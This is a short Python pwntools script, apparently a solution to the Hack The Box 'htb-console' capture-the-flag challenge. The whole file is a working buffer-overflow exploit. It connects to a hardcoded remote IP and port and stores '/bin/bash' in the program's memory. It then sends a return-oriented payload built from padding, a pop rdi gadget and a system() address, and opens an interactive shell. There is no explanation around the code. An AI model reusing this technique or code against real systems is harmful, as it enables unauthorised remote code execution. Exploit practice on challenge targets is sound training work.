#!usr/bin/env/python3

from pwn import *

# p = process("./htb-console")

p = remote("167.99.85.216",32609)

bin_bash = b"/bin/bash".ljust(16,b"\x00")


p.sendlineafter(">> ",b"hof")
p.sendlineafter(": ",bin_bash)

bin_bash_address = p64(0x000000004040B0)
system_address = p64(0x00401381)
pop_rdi = p64(0x0000000000401473)

buf = b"A"* 24
buf += pop_rdi
buf += bin_bash_address
buf += system_address


# with open("payload", "wb") as file:
# 	file.write(buf)

# g = gdb.attach(p,gdbscript="""b *0x0000000000401473""")

p.sendlineafter(">> ",b"flag")
p.sendlineafter(": ",buf)

p.interactive()